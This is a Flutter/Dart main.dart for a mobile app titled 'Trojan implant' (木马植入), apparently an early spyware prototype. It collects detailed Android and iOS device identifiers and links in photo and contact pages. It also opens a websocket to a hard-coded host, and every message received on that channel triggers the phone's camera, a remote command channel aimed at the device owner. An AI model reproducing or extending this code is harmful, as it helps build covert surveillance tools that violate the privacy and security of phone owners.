import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import './routes/photo.dart';
import './routes/home.dart';
import 'dart:io';
import './routes/contact.dart';
import 'package:web_socket_channel/io.dart';
import 'package:device_info/device_info.dart';
import 'package:image_picker/image_picker.dart';
import 'package:adaptive_dialog/adaptive_dialog.dart';

void main() {
  // runApp(const MyApp());
  runApp(const MaterialApp(
      title: 'test flutter',
      routes: {
        // "page_photo": (context) =>  const PermissionPhoto(),
        // "page_contact": (context) =>  const FlutterContactsExample(),
        // "page_socket": (context) =>  const SocketPage()
      },
      home: MyStatefulWidget()));
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final ButtonStyle style =
        ElevatedButton.styleFrom(textStyle: const TextStyle(fontSize: 20));
    return Center(
        child: Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        ElevatedButton(
          style: style,
          onPressed: () {
            Navigator.pushNamed(context, "page_photo");
          },
          child: const Text('去主页'),
        ),
      ],
    ));
  }
}

class MyStatefulWidget extends StatefulWidget {
  const MyStatefulWidget({Key? key}) : super(key: key);
  
  @override
  _MyStatefulWidgetState createState() => _MyStatefulWidgetState();
}

class _MyStatefulWidgetState extends State<MyStatefulWidget> {
  int _selectedIndex = 0;
  static final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
  Map<String, dynamic> _deviceData = <String, dynamic>{};
  var _imgPath;
  var channel ;
  final List _widgetOptions = [
    const HomePage(),
    const PermissionPhoto(),
    const FlutterContactsExample(),
  ];

  void _onItemTapped(int index) {
    setState(() {
      _selectedIndex = index;
      // Navigator.pushNamed(context, _widgetOptions[index]);
    });
  }
  Future<void> initPlatformState() async {
    Map<String, dynamic> deviceData = <String, dynamic>{};

    try {
      if (Platform.isAndroid) {
        deviceData = _readAndroidBuildData(await deviceInfoPlugin.androidInfo);
      } else if (Platform.isIOS) {
        deviceData = _readIosDeviceInfo(await deviceInfoPlugin.iosInfo);
      }
    } on PlatformException {
      deviceData = <String, dynamic>{
        'Error:': 'Failed to get platform version.'
      };
    }

    if (!mounted) return;

    setState(() {
      print(deviceData);
      print('--------');
      _deviceData = deviceData;
    });
  }

  Map<String, dynamic> _readAndroidBuildData(AndroidDeviceInfo build) {
    return <String, dynamic>{
      'version.securityPatch': build.version.securityPatch,
      'version.sdkInt': build.version.sdkInt,
      'version.release': build.version.release,
      'version.previewSdkInt': build.version.previewSdkInt,
      'version.incremental': build.version.incremental,
      'version.codename': build.version.codename,
      'version.baseOS': build.version.baseOS,
      'board': build.board,
      'bootloader': build.bootloader,
      'brand': build.brand,
      'device': build.device,
      'display': build.display,
      'fingerprint': build.fingerprint,
      'hardware': build.hardware,
      'host': build.host,
      'id': build.id,
      'manufacturer': build.manufacturer,
      'model': build.model,
      'product': build.product,
      'supported32BitAbis': build.supported32BitAbis,
      'supported64BitAbis': build.supported64BitAbis,
      'supportedAbis': build.supportedAbis,
      'tags': build.tags,
      'type': build.type,
      'isPhysicalDevice': build.isPhysicalDevice,
      'androidId': build.androidId,
      'systemFeatures': build.systemFeatures,
    };
  }

  Map<String, dynamic> _readIosDeviceInfo(IosDeviceInfo data) {
    return <String, dynamic>{
      'name': data.name,
      'systemName': data.systemName,
      'systemVersion': data.systemVersion,
      'model': data.model,
      'localizedModel': data.localizedModel,
      'identifierForVendor': data.identifierForVendor,
      'isPhysicalDevice': data.isPhysicalDevice,
      'utsname.sysname:': data.utsname.sysname,
      'utsname.nodename:': data.utsname.nodename,
      'utsname.release:': data.utsname.release,
      'utsname.version:': data.utsname.version,
      'utsname.machine:': data.utsname.machine,
    };
  }

  @override
  void initState() {
    super.initState();
    initPlatformState();
    // showTextAnswerDialog(
    //   context: context,
    //   keyword: ''
    // );
    channel =
        IOWebSocketChannel.connect(Uri.parse('ws://192.168.101.18:8019/yzxa-api/websocket/appSocket'));
    channel.stream.listen((message) {
      _takePhoto();
    });
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async { 
        print('退出');
        return true;
       },
      child: Scaffold(
        appBar: AppBar(
          title: const Text('木马植入'),
          leading: const Icon(Icons.home),
          backgroundColor: Colors.blue[700],
          centerTitle: true,
          ),
        body: Stack(
          children: [
            Offstage(
              offstage: _selectedIndex != 0,
              child: _widgetOptions[0],
            ),
            Offstage(
              offstage: _selectedIndex != 1,
              child: _widgetOptions[1],
            ),
            Offstage(
              offstage: _selectedIndex != 2,
              child: _widgetOptions[2],
            ),
          ]),
        bottomNavigationBar: BottomNavigationBar(
          items: const <BottomNavigationBarItem>[
            BottomNavigationBarItem(
              icon: Icon(Icons.home),
              label: 'Home',
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.photo_album),
              label: 'Photo',
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.contact_page),
              label: 'Contact',
            ),
          ],
          currentIndex: _selectedIndex,
          backgroundColor: Colors.blue[700],
          selectedItemColor: Colors.white,
          onTap: _onItemTapped,
        )),
    );
  }
  _takePhoto() async {
    var image = await ImagePicker().pickImage(source: ImageSource.camera);

    setState(() {
      _imgPath = image;
    });
  }
}
